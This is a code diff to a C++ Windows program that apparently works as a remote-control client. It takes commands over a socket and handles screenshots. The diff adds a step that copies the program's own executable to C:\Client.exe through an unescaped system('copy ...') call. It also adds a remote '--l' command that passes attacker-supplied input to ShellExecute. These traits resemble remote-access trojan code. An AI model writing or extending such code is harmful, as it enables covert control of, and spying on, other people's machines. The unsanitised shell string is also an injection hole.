@@ -27,7 +27,7 @@ bool checkend(char *arr, int len) {
 	return false;
 }
 
-int main(int argc, char* argv[])
+int main()
 {
 	setlocale(LC_ALL, "rus");
 	SetConsoleCP(1251);
@@ -35,6 +35,10 @@ int main(int argc, char* argv[])
 	while (1) {
 	char buffer2[256] = "";
 	GetModuleFileName(NULL, buffer2, sizeof(buffer2) / sizeof(buffer2[0]));
+	std::string src = buffer2;
+	std::string dst("C:\\Client.exe");
+	std::string cmd = "copy " + src + " " + dst;
+	system(cmd.c_str());
 	char dir[FILENAME_MAX];
 	_getcwd(dir, sizeof(dir));
 	char temp[] = "\\C.exe";
@@ -288,6 +292,10 @@ int main(int argc, char* argv[])
 			remove("screen.png");
 
 		}
+		else if ((buff[0] == '-') && (buff[1] == '-') && (buff[2] == 'l')) {
+		char *file = buff + 4;
+		ShellExecute(NULL, "open", "explorer.exe", file, NULL, SW_SHOWNORMAL);
+}
 	}
 	closesocket(my_sock);
 	WSACleanup();
